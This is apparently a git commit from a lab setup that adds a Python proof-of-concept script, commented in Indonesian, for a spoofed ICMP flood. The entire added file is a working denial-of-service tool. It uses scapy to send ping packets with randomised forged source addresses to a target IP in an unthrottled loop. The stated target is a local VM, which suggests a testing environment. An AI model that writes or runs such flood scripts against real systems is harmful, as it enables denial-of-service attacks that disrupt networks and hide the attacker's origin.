68b5487ae8d08aeabdfc422ef6ec0b11ef42f918
attackuser <attackuser@AttackVM.myguest.virtualbox.org>
2025-10-21 20:59:39 +0700

    Feat(backend): Add PoC script for spoofed ICMP flood

---
+++ backend/test_attack.py
@@ -0,0 +1,25 @@
+from scapy.all import IP, ICMP, send, RandIP
+import time
+
+# Ganti dengan IP VM Target Anda
+target_ip = "192.168.0.124" 
+
+print(f"--- Memulai PoC Serangan DDoS (IP Spoofing) ke {target_ip} ---")
+
+try:
+    while True:
+        # 1. Membuat paket:
+        #    src=RandIP() ==> Palsukan IP sumber secara acak
+        #    dst=target_ip ==> Target tetap
+        #    / ICMP()      ==> Payload-nya ICMP (ping)
+        packet = IP(src=RandIP(), dst=target_ip) / ICMP()
+
+        # 2. Mengirim paket
+        send(packet, verbose=0) # verbose=0 agar tidak print output ke konsol
+
+        print("Paket spoofed terkirim!")
+        # Kita hilangkan time.sleep() agar serangannya cepat (flood)
+        # time.sleep(1) 
+
+except KeyboardInterrupt:
+    print("\n--- Serangan dihentikan ---")
